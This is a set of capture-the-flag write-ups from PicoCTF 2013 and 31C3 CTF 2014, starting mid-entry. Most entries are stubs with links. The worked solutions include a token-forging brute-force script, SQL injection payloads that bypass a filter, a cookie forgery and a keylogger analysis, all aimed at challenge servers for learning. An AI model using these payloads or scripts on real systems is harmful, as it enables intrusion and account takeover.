* key = "T0pS3cre7key"
* ciphertext = "Bot kmws mikferuigmzf rmfrxrwqe abs perudsf! Nvm kda ut ab8bv_w4ue0_ab8v_DDU"

```python
plaintext = sys.argv[2]

ciphertext = ""
for i in range(len(plaintext)):
  rotate_amount = keychars.index(key[i%len(key)])
  if plaintext[i] in alphaL:
    enc_char = ord('a') + (ord(plaintext[i])-ord('a')+rotate_amount)%26
  elif plaintext[i] in alphaU:
    enc_char = ord('A') + (ord(plaintext[i])-ord('A')+rotate_amount)%26
  elif plaintext[i] in num:
    enc_char = ord('0') + (ord(plaintext[i])-ord('0')+rotate_amount)%10
  else:
    enc_char = ord(plaintext[i])
  ciphertext = ciphertext + chr(enc_char)
```

We can see rotate_amount is a real key. Encryption is add it, so decryption is sub it.

Make easy change:

```python
plaintext = sys.argv[2]

ciphertext = ""
for i in range(len(plaintext)):
  rotate_amount = keychars.index(key[i%len(key)])
  if plaintext[i] in alphaL:
    enc_char = ord('a') + (ord(plaintext[i])-ord('a')-rotate_amount)%26
  elif plaintext[i] in alphaU:
    enc_char = ord('A') + (ord(plaintext[i])-ord('A')-rotate_amount)%26
  elif plaintext[i] in num:
    enc_char = ord('0') + (ord(plaintext[i])-ord('0')-rotate_amount)%10
  else:
    enc_char = ord(plaintext[i])
  ciphertext = ciphertext + chr(enc_char)
```

Now input ciphertext replace for plaintext: "Usage: D:\Downloads\encrypt.py SECRET_KEY CIPHERTEXT"

```
[...]You hawe successfully decrypwed the message! The key is th4ts_w0rs3_th4n_DES
```

**Answer:** th4ts_w0rs3_th4n_DES

## Other write-ups and resources

* none yet# PicoCTF 2013: Try Them All!

**Category:** Crypto
**Points:** 45
**Description:**

> You have found a passwd file containing salted passwords. An unprotected configuration file has revealed a salt of 5948. The hashed password for the 'admin' user appears to be 02ed2bf40532f187ec9334ef37f75591, try to brute force this password.

## Write-up

Hint: There are [MD5 implementations](http://userpages.umbc.edu/~mabzug1/cs/md5/md5.html) for every major programming language. If you don't know what a [salt](http://en.wikipedia.org/wiki/Salt_%28cryptography%29) is, don't worry, it's just a string appended to the password.

Quote: "*it's just a string appended to the password*"

We'll focus on **salt of** `5948` and **hashed password** `02ed2bf40532f187ec9334ef37f75591`. Two values is different with every machine. But we'll understand the progress is:

```md5_encrypt(cleartext password + salt number) => hashed password```

This [code](trythemall.js) bruteforce cleartext password base on [Linux standar dictionary password](cracklib-small.txt). To run it, must install [Node.js](http://nodejs.org/download/). And remember to edit trythemall.js.

**Answer:** allege

## Other write-ups and resources

* none yet# PicoCTF 2013: XMLOL

**Category:** WebVuln
**Points:** 30
**Description:**

> The book has instructions on how to dump the corrupted configuration file from the robot's memory. You find a corrupted [XML file](https://2013.picoctf.com/autoproblems/tmpVrg2Ah.xml) and are looking for a configuration key.
>
> [file offline](tmpVrg2Ah.xml)

## Write-up

We can view-source by `Ctrl+U`.

```xml
<super_secret_flag>534987452539085818703732732882</super_secret_flag>
```

**Answer:** 534987452539085818703732732882

## Other write-ups and resources

* none yet# PicoCTF 2013: Yummy

**Category:** Web Vuln
**Points:** 60
**Description:**

> You want to find out the docking bay numbers for space ships that are ready to launch. Luckily for you, [the website](https://2013.picoctf.com/problems/yummy) for the docking bay ship status page doesn't seem so secure....
>
> Enter the docking bay for any of the ships that are awaiting launch.

## Write-up

`Ctrl+U` > viewsource:

```html
<div style="position: relative; width: 728px; margin: auto;">
<h1>Docking Bay Ship Status</h1>

<h2>Login Failure</h2>
<hr>
<p style="color:red">You are not authorized to view this page.</p><!-- DEBUG: Expected Cookie: "authorization=administrator"
received Cookie: "_ga=GA1.2.1340421657.1422378902; flask=.eJwNyjkOgzAQAMC_bE3hA5tdPhPtZQkhTIRMFeXvMPX84PP16-DufcA6rtsnGOfuHVZQi1xbii1WnAM3yu6WiQMGRQ4ZJrg3e2NaUNREhbzMaCqJLGsrzFSLCcL_AZb9H0I.B8D6_A.bwT7VjEnDxXR-9xfsK5u4zTJoa0; __utma=159077049.1340421657.1422378902.1424015468.1424017131.17; __utmb=159077049.2.9.1424019633889; __utmc=159077049; __utmz=159077049.1423281743.7.2.utmcsr=facebook.com|utmccn=(referral)|utmcmd=referral|utmcct=/l.php; flask2013=eyJzZXNzaW9uX2lkIjp7IiBiIjoiTWpRd09ETTRNV0kzT1dZMU5EWXpOV0ZpWkdVNVpUYzJNREJqTjJJelltRT0ifSwidGlkIjoiMzMyYWFhMjcwOTVlNDFjMjlhMWZmOWQyZDY1Y2E2ZDgifQ.B8JkeQ.mg6M1lio8B5vRGIiiJhjYIfa_rI" -->
</div>
```
Important is `Expected Cookie: "authorization=administrator"`

By a tool [edithiscookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg), add cookie entry: "authorization=administrator", a list will display.

We need "the docking bay for any of the ships that are **awaiting launch**.".

**Answer:** `DX6-7` or `DX7-2` or `DX9-5` or `DX4-9`

## Other write-ups and resources

* none yet# CTF write-ups 2013

There are some problems with [CTF](https://ctftime.org/ctf-wtf/) write-ups in general:

* they’re scattered across the interwebs
* they don’t usually include the original files needed to solve the challenge
* some of them are incomplete or skip ‘obvious’ parts of the explanation, and are therefore not as helpful for newcomers
* often they disappear when the owner forgets to renew their domain or shuts down their blog

This repository aims to solve those problems.

It’s a collection of CTF source files and write-ups that anyone can contribute to. Did you just publish a CTF write-up? [Let us know](https://github.com/ctfs/write-ups-2013/issues/new), and we’ll add a link to your post — or just add the link yourself and submit a pull request. Spot an issue with a solution? Correct it, and send a pull request.

## Contributing

Please read [CONTRIBUTING.md](CONTRIBUTING.md).

## Archive

* [Write-ups for CTFs that occurred in 2013](https://github.com/ctfs/write-ups-2013) (this repository)
* [Write-ups for CTFs that occurred in 2014](https://github.com/ctfs/write-ups-2014)
* [Write-ups for CTFs that occurred in 2015](https://github.com/ctfs/write-ups-2015)
* [Write-ups for CTFs that occurred in 2016](https://github.com/ctfs/write-ups-2016)
# 31C3 CTF 2014: cipherflag

**Category:** crypto
**Points:** 20
**Solves:** 5
**Description:**

> Say hello to 188.40.18.83:7872.
>
> Flag matches `[0-9a-f]+`.`

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 31C3 CTF 2014: hwaes

**Category:** crypto
**Points:** 10
**Solves:** 53
**Description:**

> We implemented [AES in hardware](hwaes.py) and saved a lot of memory. Feel free to use our online AES encryption service to secure your data.
>
> ```bash
> nc 188.40.18.66 2786
> ```

## Write-up

### Getting started

If you examine the script you see that we have several functions:

* setkey
* getkey
* encrypt
* flag

So we can give a key and encrypt a string with that key. But if we encrypt the flag, the code uses a random key to encrypt it but the program doesn't seem to change the key after it encrypted the flag. So maybe we can use `getkey` and decrypt the flag? But that doesn't work. After some testing with `setkey`, `encrypt` and `getkey` we notice that after an encryption our key changed. However it was still encrypted with the key we set and subsequent encryption are also encrypted with the key we set. So what key do we get if we use `getkey`? The answer can be found by examining the [encryption cipher](http://en.wikipedia.org/wiki/Advanced_Encryption_Standard#Description_of_the_cipher) very closely. The cipher makes use of several encryption rounds and each round uses a different key. Those keys are derived from the cipherkey using the [Rijndael key schedule](http://en.wikipedia.org/wiki/Rijndael_key_schedule). So the key we get using `getkey` is probably the expanded key of the cipher key. This also explains the 'hint' in the challenge description. The normal method for decrypting is making all the expanded keys from the cipherkey and storing them in the RAM. But if you just store the (first) cipherkey and the last expanded key you can decrypt and encrypt on the fly thus saving you precious RAM. So now we just need to either get the original cipherkey by inverse expanding the key we get or we can also decrypt on the fly with the expanded key. I opted for the first choice since it requires a bit less work.

### Inverse key expansion

This step requires some logic thinking but is mostly straightforward. You can find lots of information on the expanded key algorithm and you can write the code yourself or just find the code online but you don't really need this. You only need to inverse the expansion algorithm. However for completeness I added the expansion algorithm in python below.

```python
# 4-byte temporary variable for key expansion
  word = exkey[-4:]
  # Each expansion cycle uses 'i' once for Rcon table lookup
  for i in xrange(1, 11):

    #### key schedule core:
    # left-rotate by 1 byte
    word = word[1:4] + word[0:1]
    # apply S-box to all bytes
    for j in xrange(4):
      word[j] = aes_sbox[word[j]]
    # apply the Rcon table to the leftmost byte
    word[0] = word[0] ^ aes_Rcon[i]
    #### end key schedule core

    for z in xrange(4):
      for j in xrange(4):
        # mix in bytes from the last subkey
        word[j] ^= exkey[-self.key_size + j]
      exkey.extend(word)
```


To inverse this I started with the last part and unmixed bytes from the previous subkey. This results in the following code:

```python
for z in xrange(3):
  for j in xrange(4):
    # unmix the bytes from the last subkey
    word[j] ^= invexkey[j - (z+2)*4]
  temp[:0] = word
  word = invexkey[-(z+2)*4:-(z+1)*4]
```

Note that I only unmix `3` bytes and that I store everythin in a temporary array. The reason for this is because I start with the last byte and work my way to the first so I prepend every byte to the array `temp` and if I have the whole key I append it to the array `invexkey`. To get the first byte we need to unmix it with the last byte from the previous key which we just partially created. However we need to `scramble` that byte before we use it to unmix it with the first byte.

```python
word = temp[-4:]
#### key schedule core:
# left-rotate by 1 byte
word = word[1:4] + word[0:1]
# apply S-box to all bytes
for j in xrange(4):
  word[j] = aes_sbox[word[j]]
# apply the Rcon table to the leftmost byte
word[0] = word[0] ^ aes_Rcon[i]
#### end key schedule core

for j in xrange(4):
  # unmix the bytes from the last subkey
  word[j] ^= invexkey[-self.key_size + j]
```

As you can see, we didn’t need to inverse the key schedule core. Now we need to append our created subkey to the array `invexkey` and repeat the process until we have created all subkeys and the original cipherkey.

### Getting the flag

Combining the code we created in the previous step with some code to interact with the service results in [this included Python file](solve.py). Running that script gives us the flag we wanted!

The flag is `31C3\_0748a7b8be603056aa9c391e`.

## Other write-ups and resources

* <https://github.com/VMXh/write-ups/blob/master/31C3%20CTF/hwaes/README.md>
* <http://vnsecurity.net/ctf%20-%20clgt%20crew/2014/12/30/31C3CTF-crypto-hwaes-writeup.html>
* <http://tasteless.eu/2014/12/31c3-ctf-hwaes/>
* <http://hxp.io/blog/8/31C3%20CTF:%20crypto10%20%22hwaes%22/>
* <http://www.kizhakkinan.com/?p=187>
# 31C3 CTF 2014: otp

**Category:** crypto
**Points:** 30
**Solves:** 21
**Description:**

> I have seen the admin [logging in](http://188.40.18.91:8000/) with these credentials:
>
> - `admin`
> - `Sup3r&sEc\_/re_p@$$w()rd`
> - `9ae684ca583214d33905000000000000fd635dded0bbb40e162da79fba55ae32`
>
> Somehow, I cannot login… Btw, what does otp mean?

## Write-up

(TODO)

## Other write-ups and resources

* Challenge source: [source.tar.gz](source.tar.gz)
* Challenge solver: [solver.py](solver.py)
* <http://www.kizhakkinan.com/?p=193>
# 31C3 CTF 2014: sso

**Category:** crypto
**Points:** 30
**Solves:** 72
**Description:**

> In a world, where everybody and their mom rolls out their own crypto implemented PHP, Joe plays it safe with Standard Crypto.
> http://188.40.18.87:5144/

## Write-up

_By HoLyVieR_

The encryption used was done character by character, and we could decrypt any token of our choice with the `info.php` page. With this in mind, we could bruteforce each character individually until we get the character of our choice once decrypted. This would then let us craft a token with the value of our choice. Here’s an example of a decrypted token that worked:

```
{"User":"admin","Admin":1}
```

Code:

```python
import httplib

target = '{"User":"admin","Admin":1}'
conn = httplib.HTTPConnection('188.40.18.87:5144')

def getvalue(token):
	conn.request('GET', 'http://188.40.18.87:5144/info.php?token=%s' % (token), '')
	return conn.getresponse().read()

# We get this part of the token by simply using a token generated for any user
token = '69222e97316b9dd8f7'

for j in range(len(token) / 2, len(target)):
	for i in range(256):
		h = hex(i)[2:]
		if len(h) == 1:
			h = '0' + h

		r = getvalue(token + h)

		if r == target[:len(r)]:
			token += h
			break

	print(token)
```

Then we had to visit `http://188.40.18.87:5144/admin.php?token=INSERT_TOKEN_HERE`.

## Other write-ups and resources

* <http://www.crimsonagents.com/2015/01/31c3ctf-crypto-sso.html>
# 31C3 CTF 2014: bindshell

**Category:** malware
**Points:** 40
**Solves:** 5
**Description:**

> [bindshell](bindshell) running on 188.40.18.81:1024

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 31C3 CTF 2014: ls

**Category:** malware
**Points:** 25
**Solves:** 14
**Description:**

> We found [this](ls) binary and [captured](ls.pcap) some traffic…

## Write-up

I started off with inspecting the captured traffic which looked like a tcp connection to 188.40.18.94 sending some binary data back and forth. I couldn’t really make anything from it.

So off to the binary. Looking at the main function in IDA we immediately see two branches:

![](screenshot1.png)

If the environment variable `HAX` exists the program executes `sub_405BD0("188.40.18.94", 1024)` which seems to be setting up a connection to the IP address also found in the `pcap`. Running a quick `strace` we confirm that it indeed makes this connection:

```bash
$ export HAX=hax
$ strace ./ls
	...
	socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
	connect(6, {sa_family=AF_INET, sin_port=htons(1024), sin_addr=inet_addr("188.40.18.94")}, 16) = 0
	...
```

During this strace I also noticed the program then just blocks and waits (using `epoll_wait`) until I pressed a key. When a key was pressed something was read and then written to the TCP socket.

Since the challenge category was ‘malware’ I assumed it was some sort of keylogger which sent the keylogged data to the hacker machine at 188.40.18.94.

Next I ran `ltrace` on the program in which I noticed the program also looks for the `G_DEBUG` environment variable which ment the program was probably spitting out some debug messages using `glib`. So I ran the program with `G_MESSAGES_DEBUG=all`:

```bash
$ G_MESSAGES_DEBUG=all ./ls
	** (process:3600): DEBUG: connected!
	** (process:3600): DEBUG: key initialized!
	** (process:3600): DEBUG: attaching '/dev/input/by-path/pci-0000:00:1d.0-usb-0:1.6.1:1.0-event-kbd'
	** (process:3600): DEBUG: attaching '/dev/input/by-path/platform-i8042-serio-0-event-kbd'
```

This pretty much confirmed my assumption of the program being a keylogger: it attaches itself to `/dev/input/by-path/platform-i8042-serio-0-event-kbd` from which my keyboard input events can be read.

The program also mentions something about a key being initialized after the TCP connection being made. I went to look for this string in IDA which was at subroutine `sub_4055E0`. This subroutine basically does two things: first it sets up the TCP connection to 188.40.18.94:1024. Next it reads 32 bytes from this connection and uses them as the ‘key’. My first thought here was that the key was probably used to encrypt the traffic to the server.

Next I took the following steps:

- Load the program in `gdb` and put a breakpoint where the key is being initialized.
- Find out the address of the key (buf in the screenshot below).
- Put a read watchpoint (`rwatch *buf` in `gdb`) on this address to find out where the key is being used

![](screenshot2.png)

The key was being used in at address `0x43afb1` which was part of the subroutine `sub_43AEA0` so I assumed this was the encryption method.

After looking at this method I was ready to give up. The method is a giant clutter of assembly instructions.

However I kept digging trough it with gdb and noticed the `r8` registry contained the `2-by` string which was rater interesting. I traced this back to `0x43B00E` which had the following instructions:

```
mov     rdx, 61707865h
mov     rcx, 3320646Eh
mov     r8, 79622D32h
mov     rax, 6B206574h
```

The string `expand 32-byte k` was being loaded in those 4 registers. A quick Google search revealed that this string was used in [the Salsa20 encryption library](http://cr.yp.to/snuffle/salsa20/merged/salsa20.c).

I also found this great [Python Salsa20 library](https://github.com/keybase/python-salsa20) which we’ll use later.

So putting this together I assumed the program flow was as follows:

- Make a connection to 188.40.18.94:1024.
- Capture all key events and encrypt them using Salsa20 with a key received by the server.
- Send the encrypted events to the server.

However, to encrypt/decrypt using Salsa20 a nonce is also needed. Looking back at the binary where the Salsa20 encrypt is being called we see a couple of parameters:

![](screenshot3.png)

- `rsi` contains pointer to key event data (`=rsp`)
- `rdi` contains pointer to where the encrypted key event data will be stored (`=rsp`)
- `rdx`/`edx` contains length of data to encrypt (`= 0x18`)
- `r8` contains the pointer to the key
- `rcx` which is the only one left over, this must be the nonce then!

I then put a breakpoint right before the encryption to find out the nonce. It seemed like it started at `0` and then got increased by `1` for every encryption.

Putting all the findings together we can create a Python script using the previously mentioned library to decrypt the data in the pcap!

After the events are encrypted all that’s left to do is to parse the key events and extract what the victim was typing.

Some Googling revealed that the key events are stored in a struct:

```c
struct input_event {
	struct timeval time;
	__u16 type;
	__u16 code;
	__s32 value;
};
```

Additionally I used the `evdev` Python module to replay the events to make my computer actually type out the flag.

The script to do all this can be found [here](decrypt.py).

Running this made my computer type out the flag: `31C3_7yp3_s4f3ty!1`.

## Other write-ups and resources

* <http://tasteless.eu/2014/12/31c3-ctf-ls-writeup/>
# 31C3 CTF 2014: orbb

**Category:** malware
**Points:** 10
**Solves:** 30
**Description:**

> [orbb](orbb) running on 188.40.18.85

## Write-up

(TODO)

## Other write-ups and resources

* <http://l4w.io/2014/12/31c3-ctf-writeups/>
# 31C3 CTF 2014: Rick

**Category:** malware
**Points:** 15
**Solves:** 49
**Description:**


> Seems like somebody got pwned [http://188.40.18.67](http://188.40.18.67)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctfcrew.org/writeup/95>
# 31C3 CTF 2014: Roll

**Category:** malware
**Points:** 30
**Solves:** 6
**Description:**

> Time to pwn back, look for the malware on the compromised host!
> You must solve **Rick** first to be able to solve this challenge.
>
> **Hints:**
> - The goal is to retrieve credentials for C&C IRC channel from memory, do this by pwning the service on port 1337
> - Some people asked for the firewall rules on Roll:
>```
> *filter
> :INPUT DROP [56:3360]
> :FORWARD ACCEPT [0:0]
> :OUTPUT ACCEPT [997:167700]
> -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
> -A INPUT -p tcp -m tcp --dport 1234 -j ACCEPT
> -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
> -A INPUT -p tcp -m tcp --dport 80 -m limit --limit 1/sec --limit-burst 1 -j ACCEPT
> -A INPUT -p udp -j ACCEPT
> -A INPUT -p icmp -j ACCEPT
> COMMIT
>```
> - Debug build with more or less useful output available at the location of the old binary

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 31C3 CTF 2014: booking

**Category:** pwn
**Points:** 35
**Solves:** 6
**Description:**

> You want to book a hotel?
>
> ```bash
> nc 188.40.18.93 1234
> ```
>
> [booking_9c4d0f3b05123339a27bc411b4df88d3.tar.gz](booking_9c4d0f3b05123339a27bc411b4df88d3.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* Challenge source: [source.tar.gz](source.tar.gz)
* Challenge exploit: [exploit.py](exploit.py)
* <https://rzhou.org/~ricky/31c3/booking/>
* <http://pastebin.com/paAmGcgS>
# 31C3 CTF 2014: cairo

**Category:** pwn
**Points:** 30
**Solves:** 5
**Description:**

> [Draw](http://188.40.18.72:8000/) some nice images
>
> [cairo.tar.gz](cairo.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* Challenge source: [source.tar.gz](source.tar.gz)
* Challenge exploit: [exploit.py](exploit.py)
# 31C3 CTF 2014: cfy

**Category:** pwn
**Points:** 10
**Solves:** 76
**Description:**

> [cfy](cfy) running on 188.40.18.73 3313

## Write-up

(TODO)

## Other write-ups and resources

* <http://l4w.io/2014/12/31c3-ctf-writeups/>
* <http://gnoobz.com/31c3-ctf-cfy-writeup.html>
* <http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy/>
* [Vietnamese](https://babyphd.net/2015/01/write-up-31c3-cfy/)
* <https://rzhou.org/~ricky/31c3/cfy/exp.py>
* <http://pastebin.com/qwhUBLMx>
# 31C3 CTF 2014: cfy2

**Category:** pwn
**Points:** 30
**Solves:** 6
**Description:**

> 1. Pwn cfy
> 2. `nc 127.0.0.1 3314`

## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/31c3/cfy2/>
# 31C3 CTF 2014: Fyltr

**Category:** pwn
**Points:** 15
**Solves:** 3
**Description:**

> We proudly present you our totally awesome and hip data scanning service: Fyltr.
>
> A demo is available at:
>
> ```bash
> $ nc 188.40.18.88 1031
> ```
>
>You can conveniently write your filters in code and because they are compiled, it’s also blazingly fast! And since Fyltr is written in Erlang, nobody will be able to own our [servers](fyltr-release.tar.gz), keeping your data secure.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 31C3 CTF 2014: maze

**Category:** pwn
**Points:** 40
**Solves:** 12
**Description:**

> Where do you want to go (today)?
>
> ```bash
> nc 188.40.18.71 1234
> ```
>
[maze_6a865c7769f331be0666c5c7dccbba9b.tar.gz](maze_6a865c7769f331be0666c5c7dccbba9b.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.clevcode.org/31c3-ctf-maze-write-up/>
* Challenge source: [source.tar.gz](source.tar.gz)
* Challenge exploit: [exploit.py](exploit.py)
# 31C3 CTF 2014: mynx

**Category:** pwn
**Points:** 30
**Solves:** 25
**Description:**

> [mynx](mynx) running on 188.40.18.80 1234

## Write-up

(TODO)

## Other write-ups and resources

* <http://l4w.io/2014/12/31c3-ctf-writeups/>
* <http://kitctf.de/writeups/31c3-ctf/mynx/>
* <http://blog.dragonsector.pl/2015/01/31c3-ctf-mynx-pwn-30.html>
* [Vietnamese](https://babyphd.net/2015/01/write-up-31c3-mynx/)
* <https://rzhou.org/~ricky/31c3/mynx/>
* <http://pastebin.com/bvkMhDSy>
# 31C3 CTF 2014: Nokia 1337

**Category:** pwn
**Points:** 30
**Solves:** 3
**Description:**

> Enter the trilogy: pwn this [phone](fon.tar.gz). Please use only the qemu provided.
>
> Remote instance requires proof of work: `nc 188.40.18.78 1024`
>
> creds:
>
> mobile/mobile
> root/root (local image only)
> Connect locally via telnet to localhost:10023 after qemu booted completely.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/12/31c3-ctf-nokia-1337-pwn-30.html>
* <https://rzhou.org/~ricky/31c3/nokia1337/>
# 31C3 CTF 2014: Nokia 31337

**Category:** pwn
**Points:** 50
**Solves:** 1
**Description:**

> Root the phone.
>
> **Note:** You need to solve Nokia 1337 first.
>
> **Hint:** Baseband processors do not have memory protections

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 31C3 CTF 2014: pin

**Category:** pwn
**Points:** 30
**Solves:** 15
**Description:**

> Test your x86_64 shellcode here but don’t escape the [sandbox](pin_588a1b80dfc92071363b868e70d187d9.tar.gz) please…
>
> ```bash
> nc 188.40.18.84 1234
> ```

## Write-up

(TODO)

## Other write-ups and resources

* Challenge exploit: [exploit.py](exploit.py)
* <https://rzhou.org/~ricky/31c3/pin/>
# 31C3 CTF 2014: pong

**Category:** pwn
**Points:** 30
**Solves:** 2
**Description:**

> To play it, connect to our [server](pong.tgz) via:
>
> ```bash
> socat -,raw,echo=0 TCP:188.40.18.92:2001
> ```
>
> Have fun!

## Write-up

(TODO)

## Other write-ups and resources

* <http://pastebin.com/wuXfUuUU>
# 31C3 CTF 2014: saas

**Category:** pwn
**Points:** 50
**Solves:** 4
**Description:**

> Sorting as a Service!
>
> ```bash
> nc 188.40.18.75 1234
> ```
>
> [saas_5007caf1e0c58894fe6b48020603185f.tar.gz](saas_5007caf1e0c58894fe6b48020603185f.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://kitctf.de/writeups/31c3-ctf/saas/>
* [Challenge source: `source.tar.gz`](source.tar.gz)
* [Challenge exploit: `exploit.tar.gz`](exploit.tar.gz)
* <https://rzhou.org/~ricky/31c3/saas/>
# 31C3 CTF 2014: sarge

**Category:** pwn
**Points:** 20
**Solves:** 10
**Description:**

> [sarge](sarge.tar) running on 188.40.18.82 1234

## Write-up

(TODO)

## Other write-ups and resources

* <http://gnoobz.com/31c3-ctf-sarge-writeup.html>
# 31C3 CTF 2014 write-ups

* <https://31c3ctf.aachen.ccc.de/>
* [Scoreboard](https://31c3ctf.aachen.ccc.de/scoreboard/) or [local alternative](scoreboard.txt)
* [Number of solves per task](solves.txt)

## Completed write-ups

* [hwaes](crypto/hwaes)
* [sso](crypto/sso)
* [ls](malware/ls)
* [Devilish](web/devilish)

## External write-ups only

* [otp](crypto/otp)
* [orbb](malware/orbb)
* [booking](pwn/booking)
* [cairo](pwn/cairo)
* [cfy](pwn/cfy)
* [cfy2](pwn/cfy2)
* [maze](pwn/maze)
* [mynx](pwn/mynx)
* [Nokia 1337](pwn/nokia-1337)
* [pin](pwn/pin)
* [Rick](malware/rick)
* [saas](pwn/saas)
* [casino](reversing/casino)
* [code\_mess](reversing/code_mess)
* [numeric](reversing/numeric)
* [5CHAN](web/5chan)
* [http](web/http)
* [Page Builder](web/page-builder)
* [pCRAPp](web/pcrapp)
* [pong](pwn/pong)
* [sarge](pwn/sarge)
* [whatson](reversing/whatson)

## Missing write-ups

* [cipherflag](crypto/cipherflag)
* [bindshell](malware/bindshell)
* [Roll](malware/roll)
* [Fyltr](pwn/fyltr)
* [Nokia 31337](pwn/nokia-31337)
* [bor ey](reversing/bor-ey)
* [crackme](reversing/crackme)
* [Merkelfon](reversing/merkelfon)
* [radio heat](signals/radio-heat)
* [safelock](signals/safelock)
# 31C3 CTF 2014: bor ey

**Category:** reversing
**Points:** 20
**Solves:** 38
**Description:**

> Ever imagined compiled stack-based Perl?
> It could look like [this](bor_ey.tar.gz), but maybe this one is even worse, so we start with an easy one.
> Try to find the flag in this binary, but don’t forget to run:
>
> ```bash
> objdump -h bor_ey
> ```

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 31C3 CTF 2014: casino

**Category:** reversing
**Points:** 20
**Solves:** 180
**Description:**

> Let's play a [game](casino.ey)!
>
> ```bash
> nc 188.40.18.77 2000
> ```

## Write-up

(TODO)

## Other write-ups and resources

* <http://l4w.io/2014/12/31c3-ctf-writeups/>
* <http://www.crimsonagents.com/2015/01/31c3ctf-reversing-casino.html>
# 31C3 CTF 2014: code_mess

**Category:** reversing
**Points:** 20
**Solves:** 15
**Description:**

> [fee27ce2301c270752a6ea9c0f39aaaf_code_mess.tar.gz](fee27ce2301c270752a6ea9c0f39aaaf_code_mess.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* Challenge source: [source.tar.gz](source.tar.gz)
* Challenge solver: [solver.tar.gz](solver.tar.gz)
# 31C3 CTF 2014: crackme

**Category:** reversing
**Points:** 50
**Solves:** 5
**Description:**

> [crackme](crackme)
>
> **Note:**) This is a last minute entry and we haven’t broken this ourselves. Don’t expect any support. You can probably spend lots of time on this and not get anywhere. The risk is yours, you have been warned.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 31C3 CTF 2014: Merkelfon

**Category:** reversing
**Points:** 20
**Solves:** 1
**Description:**

> Merkel is under surveillance. Merkel will receive confidential SMS once in a minute or so. Maybe the NSA left something useful.
>
> **Note:** You need to solve Nokia 1337 first!

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 31C3 CTF 2014: numeric

**Category:** reversing
**Points:** 20
**Solves:** 8
**Description:**

> Hope you have enough time for this to finish flag calculation…
>
> [`numeric_bd4a7b7defb41bc30eafb0247a5bb22e.tar.gz`](numeric_bd4a7b7defb41bc30eafb0247a5bb22e.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* Challenge source: [source.tar.gz](source.tar.gz)
* Challenge solver: [solver.py](solver.py)
# 31C3 CTF 2014: bor ey

**Category:** reversing
**Points:** 20
**Solves:** 65
**Description:**

> [`whatson`](whatson)

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/12/31c3-ctf-whatson-writeup/>
# 31C3 CTF 2014: radio heat

**Category:** signals
**Points:** 25
**Solves:** 1
**Description:**

> We scratched this file from a harddrive that fell from a Gnu. It may contain a secret… [`radio_heat_29f5ae02d08c6b204.tar.gz` (158.9 MB)](https://mega.co.nz/#!3kJxSIYR!0ybJfl8lRgWLBZegwhZmSDh20x6j35I87uzq1LMrovM)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 31C3 CTF 2014: safelock

**Category:** signals
**Points:** 20
**Solves:** 2
**Description:**

> This is the circuit of a safe lock. Get the key to open it! <http://188.40.18.86/safelock/>
> It’s neither about webtronics nor ngspice. Disregard bugs in both.
> If you want to write spice code directly, use something like this:
>
> ```bash
> cat test.cir | curl --data-binary '@-' http://188.40.18.86/safelock/contest_spice/spice.cgi
> ```
>
> **Hints:**
>
> - when you hand-build your SPICE code: keep in mind that the first line is special and should be a comment, otherwise it is ignored.
> - The web interface does fully work with Chrome. Use Firefox.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# 31C3 CTF 2014: 5CHAN

**Category:** web
**Points:** 15
**Solves:** 226
**Description:**

> 5CHAN? Never heard of this image board, but they have exactly what we need. The picture we’re looking for is not for public, so can you get it?
>
> <http://188.40.18.89/>

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.crimsonagents.com/2014/12/31c3ctf-web-5chan.html>
# 31C3 CTF 2014: Devilish

**Category:** web
**Points:** 30
**Solves:** 24
**Description:**

> It’s some devilish community public portal, we’re pretty sure there’s something else out there, a private portal maby, we’d like to know the secret behind it.
> <http://188.40.18.70/>

## Write-up

_by boogy_

The web page reveals a nice vampire-style web page. After some research we can see that there is a SQL injection vulnerability in the `PROFILE` endpoint.

```
http://188.40.18.70/PROFILE/55\/||extractvalue(3,concat(0x3a,(select%0bconcat_ws(0x3a3a,id_user,Us3rN4m3)%0bfrom%0busers%0blimit%0b0,1)))--%0b
```

The font used by the web page is an icon font, so you need to view the HTML source all the time to see the error message from the SQL injection. One of our team members had the idea to disable the `gfx.downloadable_fonts.enabled` option in Firefox through `about:config`. Here’s the result before changing the setting:

![](injection-1.png)

And here is the same page after setting `gfx.downloadable_fonts.enabled` to `false`:

![](injection-2.png)

Better, isn’t it?

OK, so now we know where the injection is and we can run commands. But there’s an annoying filter that prevents us from enumerating columns: things like `information_schema`, `table`, `or`, `union` are all filtered, so we need to find a way around it. What we need is the password column name to be able to log in.

To enumerate the columns without the above keywords we can do error-based SQL injection based on a ‘duplicate keys’ error. This will enumerate the columns for us. So the final exploit for the SQL column problem is:

```
http://188.40.18.70/PROFILE/55%5C/||extractvalue%28null,concat%280x3a,%28select%09*%09from%28select%09*%09from%09users%09as%09a%09join%09users%09as%09b%09using%28id_user,Us3rN4m3,Em4iL4dR3Szz,S4cR3dT3xT0Fm3,MyPh0N3NumB3RHAHA,Addr3Zz0F_tHi5_D3wD,CHAR_LOL%29%29as%09x%29%29%29--%0B
```

This gives us:

```
Duplicate column name 'P4sWW0rD_0F_M3_WTF'
```

